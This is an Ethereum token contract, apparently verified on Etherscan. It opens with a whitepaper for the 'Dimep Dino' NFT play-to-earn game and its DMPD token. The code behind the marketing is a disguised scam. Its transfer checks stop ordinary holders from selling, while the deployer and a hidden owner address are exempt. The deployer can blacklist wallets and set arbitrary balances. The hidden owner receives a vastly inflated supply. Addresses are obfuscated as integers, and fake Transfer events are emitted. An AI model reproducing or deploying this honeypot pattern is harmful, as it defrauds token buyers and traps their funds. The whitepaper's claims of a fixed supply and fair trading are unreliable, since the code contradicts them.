/**
 *Submitted for verification at Etherscan.io on 2023-02-28
*/

/*

https://dimepdino.com

Summary

Dimep Dino is a multiplatform NFT P&E(Play & Earn) simulation roleplay game. The game stars a diverse lineup of dinos with unique types and colors, which are created by material called Dimep Ampoule (Utility Token).

Players are on a mission to defend their habitat from invaders. On the road, players are able to collect various possessable values. Each digital asset that players earn is stored as a token or NFT in a wallet. Within Dimep Dino's intuitive ecosystem, players can conveniently manage their digital assets and interact natively with the blockchain system, other gamers, player support, and creators.

The irresistibly charming game characters motivate players to keep playing and grow their collections. Each dino is an NFT character, and their monetary value can go beyond just game income. We intend for characters' IPs to be licensed through franchising and spin-off game launches. Our ultimate purpose is to grow into a multi-metaverse platform where production and consumption inflates and deflates to balance a steady economy system.

To achieve these objectives, the most important task is to develop a value-cycle-based gaming blockchain ecosystem. For such an advanced gaming system to run smoothly, both the limitations of conventional PLC games and the shortfalls of NFT games should be addressed.

The following missions and purposes will be completed stage-by-stage as the game takes form.

Mission and Purpose

1- To evolve into a next-level play-to-earn game overcoming the current limitations of

2- blockchain-based games To create an intuitive NFT game that's attractive to the mainstream public with high-quality graphics and gameplay

3- To retain game asset value through transparent algorithms and inflation management to keep current players and attract new players

4- To enable multi cross-game trade & play that lets players liquidize their digital assets. To suggest new paradigm for Game De-Fi and establishment of continuity of the game user's Play to Earn rewards system

It is crucial for all stakeholders, from the game studios to game platform companies, and game players, to reconsider and recognize how we evolved the game environment, for us to complete these missions. By fulfilling our purpose, we believe Dimep will be a springboard, pushing the NFT gaming ecosystem forward.

Project Concept Background

1.1 Our Direction

Since the late 2010s, NFT games have emerged in various genres with solid market results. Among them, play-to-earn NFT games are one of the most significant players shaping the NFT gaming market. Strong market conditions have directly influenced the NFT gaming sector's size and quality. Yet there are still problems to be solved due to the NFT gaming market's formulaic nature, which doesn't consider the nuances of real-life experiences. The market still lacks competitiveness among games. At Dimep, we aim to be a key pioneer in the NFT market with a multi-faceted and diverse approach that realizes the vast potential of NFT games.

1.2 Item Trade & Migration

In conventional gaming, there have been attempts to make trading part of the game content. Yet many of these cases haven't been completed due to item ownership issues and regulations on transactions. Because of this, most players turn to 3rd party platforms to trade instead. Allowing such transactions to happen in the game could be a huge risk for game developers. Yet, for players, there's no way to make real-life gains from valuable game items without resorting to external trades. To resolve this problem for both parties, we use blockchain technology for safe and simple trading. As a result, game assets will have a determined value within the game's transparent ecosystem.

1.3 Earning vs. Playing

Many of today's NFT games focus on the "how to earn" element of "play-to-earn" than the fun and enjoyment of gaming. Players, of course, have the freedom to decide their own gaming objectives. But, as developers, we believe it's possible to create a game that balances both playing and earning. By thoughtfully considering the player experience, gameplay efficiency, and required playtime, we're creating an NFT game that's both fun and lucrative.

1.4 NFT Expert Group

Early NFT games focused more on owning game items than gaming. Many of these games were short-lived due to poor playability and failing to keep players engaged. To avoid this, Dimep Dino has involved gaming and blockchain experts through the whole game planning process. The aim is to create an entirely new gaming ecosystem that retains players through a fun and exciting game experience.

Introducing Dimep Dino

Dimep Dino is a casual SRPG (simulation role playing game) where players use NFT-based dinos with unique, bold personalities to defend their habitat against wild mutants with genetic deformations. Dinos have their own individual abilities on which players can base their strategies. To broaden their collection, players can breed new dinos or adopt from other players. It's also possible to enhance their ability levels and appearance using materials acquired through the game.

The game features a marketplace to trade and sell dinos. To maximize their earnings, players can also lease out their dinosaurs or carry out expeditions.

Mini-games, which are also available to play pre-launch, give players extra ways to accumulate game items, build experience, and increase the value of their dinos.

Dimep Dino is platform-independent and can be run on practically any operating system, with mobile optimization for seamless gameplay, whatever the device.


2.2 Game Structure

Dimep Dino's gameplay system was created to boost the value of NFTs in an exciting and immersive way. The player's choice of game modes and methods of play influence how the game progresses. Manual, automatic, and semi-automatic modes can be used simultaneously for more efficient earnings.

For example, when players create expedition teams, they can acquire various assets through their teams, even without playing. This passive asset income can be used to upgrade dinos and increase their value. With so many variable ways for each player to strengthen their dino collection, PvP mode becomes even more exciting and unpredictable. Rewards are earned according to the strength of the dino collection.


2.3 Dino Characters

Dimp Dino is a unique creature created by young Dino eating the Dimep Essence of Dimep Amber from Amber Tree. Dino can be grown, upgraded, and destroyed by users.

2.3.1 Dimep Dino Life Cycle

Eggl

Eggs are made from breeding, and the colors and shapes indicate the dino's traits.

[Sprout Dino]

After an egg hatches, it becomes a Sprout Dino. Although dinos are born with genetic traits, some attributes may vary as they grow. At this stage, variation is mainly influenced by Teen Dino transition timing.

[Teen Dino]

During this peak growth phase, the Teen Dino develops around 80% of their traits before transitioning into an Adult Dino.

[Adult Dino]

Adult Dinos are fully formed and can join battles. Although their traits are finalized, it's possible to use partial upgrades or send them to the marketplace for adoption.


2.3.2 Dino Talents & Classes

Dino's stats and visuals are determined by whether they are a carnivores, herbivores, or omnivores.

The battle class is based on the fruit ampoule used during breeding, and a dino could be a Tank (Tankers), Deal (Dealers), or Supporter.

Other than dragon fruit, each fruit is strong and weak against other fruits and is concentrated in ampoules when breeding dinos.


2.3.3 Dino Body Parts

Dinos' varying physical characteristics go hand-in-hand with the unique nature of NFTS.

As well as the three talent categories, three roles, and ten fruit attributes, each dino also has different body parts. There are ten possible characteristics for their horns, mlaths, eyes, backs, tails, wings, body patterns, and body colors.

This makes an almost infinite number of possible dino types that can be bred and then enhanced further through partial upgrades.


2.4 Breeding System

2.4.1 Overview

Dimep Dino basically can be made through breeding. Fruit genes are passed onto dinos to form their external appearances and characteristics, creating practically endless possibilities. The diversity of the Dino Kingdom makes the game even more enticing to players who eagerly wait to see what their next dino will look and act like. When dinos are born, they're assigned a certain number of breeding seasons. This could be anything between four and seven and varies between different dinos. More details on dino breeding will be released later on when the breeding is available.

2.4.2 Mutation

Breeding outcomes can usually be predicted since they're based on genetic probabilities. However, mutations do ocr on rare occasions, and these mutants are born with attributes not found in their parents.


2.4.3 Genetic Evolution

In rare cases, when a parent's genetic value surpasses a specific amount, their offspring could be born with evolved physical attributes. However, there's a low probability of cases like this, and dinos born under these conditions look more unique and have stronger abilities.

2.4.4 Legendary Dino Breeding

Dinos with legendary genes cannot pass that genetic information down to their offspring. Except for the Genesis Legendary Dinos, the possibility of creating legendary Dino is low and can only be done through crafting.

2.5 Game Systems

2.5.1 Lease System

New players can borrow dinos from existing players through a lease system since marketplace trading and breeding can be expensive. The intention is to lower the barrier to entry for new players while letting existing ones earn via rental fees. As the Dino Lease System exists within the service, it's easy for borrowers and lenders to transact without external communication.

2.5.2 Expedition System

Dimep Dino has an expedition system where players can collect rare items even when not playing. To use expedition mode, the player must form an expedition team. The regions explored could be public land or private land and can be chosen by the players. On expeditions to private land, it's possible to collect rare items which boost dinos' performance levels. However, exploring private land comes with limited fees that must be paid to the player who owns that land. Players should also consider that expeditions can take longer than expected.

2.5.3 Crafting System

Players can create dino parts with rare materials and natural resources excavated during expeditions. The dino's physical appearances and attributes can improve using parts upgrades. In the future, there will be a system to disassemble dinos and turn them into NFT parts.

2.5.4 Partial Upgrades

Partial upgrades let players boost their dino's appearance and performance and also increase the value of their NFTS. Worthwhile upgrades require effort, time, and also luck.

Upgrades produce rarer appearances and attributes than biological traits inherited through breeding. These factors cannot be inherited and remain specific to that dino.

2.5.5 Dino Lands

Dino lands are places where players can train dinos to improve their stats. There are also diverse natural resources to pick up. When these items are used with expedition materials for crafting, players can create unique new parts to make dinos even stronger.

If a player owns land, they can rent it out to others for a leasing fee, and earn rewards which can be tokenized.

Until the game begins to unfold, it's impossible to know all the stories dino lands will hold.

Dimep Dino Ecosystem

3.1 Overview

 Through our game developrment, we'll create an advanced play-to-earn blockchain ecosystem focused on user experience with simple processes and features.

Native game content will be created with consideration for the market volatility of both internal and external economic systems.

Dimep Dino features two ERC20 based tokens that determine the value of game assets and are the basis of the ecosystem. These tokens will also make the game more popular. 

The Dimep Dino Governance Tokens sustain the ecosystem's operations and circulation to create a flourishing tokenomic environment that players can benefits from.

3.2 DMPD Governance Token & DMR Utility Token

3.2.1 DMPD Token Assets

DMPD (Dimep Dino Token) is Dimep Dino's governance token, based on ERC20 for ecosystem maintenance. DMPD also connects game to real-world systems and influences the entire value system. Players can become part of the DAO governance through DMPD staking. AS DMPD holders. they can use their tokens to influence decisions on maintaining and advancing the Dimep Dino Ecosystem. There are also rewards associated with this role.

The DMPD will increase in value as more people join Dimep Dino ecosystem since they will be the basis of Dimep Dino's Dinoverse token economy. The fixed initial supply will not be surpassed and additional DMPD will not be issued arbitrarily as the game progresses.

3.2.2 DMR Token Assets

DMR are ERC20 based utility tokens issued separately to players from the DMPD governance tokens. Dimep Dino will offer various ways for potential players to earn and use DMR to entice them to play the game. These game features include the Expedition System, Crafting System, and Lease System. The amount of DMR that players can acquire will vary according to their choice of game contents.

3.3 Dimep Dino NFTs 

Within Dimep Dino, bought and earned game items are issued as NFTS that generate value for players.

3.3.1 Dinos

Each dino is an NFT created through breeding with other dinos. However dino values can also increase utilizing dino burning system.

3.3.2 Dino Lands & Land Objects

Dino lands are NFTs that can be traded and leased through the marketplace. Players can decorate these lands and make tradable NFT land objects.

3.3.3 Dino Parts

Parts collected throughout the game can be crafted into dino parts to trade as NTS.

3.3.4 Recipe Scrolls 

Recipe Scrolls appear randomly in the game. With some scrolls rarer than others, it enables players to start crafting dino parts with higher rarity. These are also NFTs tradable with other players.

3.4 Play-to-Earn Features

Dimep Dino plans to offer a variety of play-to-earn games that satisfy players varying tastes and have different reward systems.

3.4.1 PVE (Player vs Environment Games)

Adventure Mode: rewards are granted through basic gameplay after completing stages which can be tokenized. Automatic play is also being planned for easier and smoother play.

Expedition Mode: Players can collect items that increase in value even when they are away from the screen. Materials are used to make parts or upgrade dinos. Corresponding parts are also tradable.

Raid Mode: Players can join raids to find more valuable items within specific time slots throughout the week. Specific materials can only be found through raids.

PVE Quest: Players can earn tokens by completing different quests.

3.4.2 Season Events

Dino Race: Players who own dinos with special attributes can join races to earn tokens. Non-participants can still be compensated by guessing the correct Dino Race winners.

3.4.3 PvP (Player vs. Player Games)

Tournaments: Tokens are awarded based on the rankings of regular battles. 

Battle Royale: The last player standing receives a token reward.

Esports: During esports events, tokens are awarded to prize-winners. 

PVP Quest: Players receive tokens for completing quests.

3.4.4. Marketplace

The following items can be traded in the marketplace for additional income: 

Eggs and dinos acquired through dino breeding

Dino lands

Dino parts made through crafting

Minted Dinos (from mini game)

3.4.5 Dino Lease

Dino lease: Players can lease their dinos for rental income.

3.4.6 DeFi and DAO

DeFi participation: Players can use the DeFi services within the ecosystem. 

DAO: Members receive DAO reward compensation through governance token staking

3.5 Dimep Dino Ecosystem

Dimep Dino has an ecosystem where values circulate through various transactions inside the game-we call it Dinoverse.

In Dinoverse, the Dimep Dino & Game DeFi system and the game users & DAO are the two axes. Through the Dinoverse services, users can create and trade using DMPD (the governance token) and gain operational earnings and income through NFTs and Staking. These activities are the core of what drives Dinoverse's tokenomics and grows the ecosystem.

Our Technology

Blockchain technology goes beyond the trade of simple assets and now expands into businesses through smart contracts and has real-life use cases throughout society. Prior to Dimep Dino, our team members were involved in planning and developing various blockchain technology services.

We are merging the expertise we gained from past experiences in both blockchain and gaming to make Dimep Dino a next-level play-to-earn game. Our token economy also exists as an ecosystem where participation and rewards flow in a virtuous cycle.

5.1 Gaming & Blockchain

To create a successful NFT game with a flourishing ecosystem, it's essential to have the technological ability to make big ideas real. Every member of our Dimep Dino team was chosen for their experience in the two main business pillars-blockchain and game development. They have been involved in various successful projects from which they bring invaluable knowledge.

Our Game Team is highly-accomplished, having spent many years at global game development and Publishing companies. Their experience planning and running game economy systems with many simultaneous players is Invaluable when constructing an NFT game.

Our Blockchain Team is made up of full-stack developers and top-class engineers with collective experience across practically every conceivable development area. Regardless of the difficulty, this team proficiently creates blockchain asset exchange services, wallet solutions, exchange solutions, the NFT platform, links to 3rd party solutions, mainnet development, and more.

With experience developing games based on coin platforms, they have the technical knowledge of each platform's advantages and disadvantages concerning fees, processing speeds, and extensibility and optimize accordingly. As many have been in NFT gaming since 2019, they have the insight to construct a more stable and reliable service. To bring Dimep Dino to life as a smooth-running play-to-earn game, we are establishing the following blockchain ecosystem:


*Create a private blockchain for play-to-earn game development and construct a proprietary ecosystem

*Creation and establishment of NFT game and game system for the multiplatform gaming experience

*Development of bridge chain connecting public chain and our private chain 

*Development of own SDK to enable third-party NFT games

*Development of independent platform to service P&E NFT games.


5.2 Game DeFi

Dimep Dino will create a Game DeFi service framework that allows players to conduct trades and other economic activities simply and without barriers.

In conventional gaming, many players run into problems when trading items, such as ownership disputes, trade inconveniences, escrow issues, syncing problems, and more. As NFT games are built on blockchains, these problems are diminished.

Most of our Game DeFi services are already developed, and others will follow according to the game roadmap.

5.2.1 Game DeFi Services

Dimep Dino plans to include the following within the Game DeFi service:

*Token swap service for convenient use of DMPD token

*DMPD/NFT staking dashboard 

*Gamification of Game Defi service which combines investment with game contents

*P2P trading service 

*Governance voting

These services will be the basis of our Game DeFi and be upgraded continuously alongside the game's expansion.


5.2.2 Game DeFi Benefits

The barrier to entry for NFT games is a massive hurdle for potential new players and is only slightly more accessible to those with blockchain experience. Many consider such a burden a rite of passage into the blockchain world, but it does discriminate mainstream audiences looking for casual gaming experiences. 

To take full advantage of NFT gaming, players must understand the services and how to access them. Yet game developers often take this too far and create overly simplified services. 

Dimep Dino will feature a full Game DeFi to resolve these challenges. The all-in-one format will be intuitive to all users and enhance the gaming experience.

*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract DimepDino  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}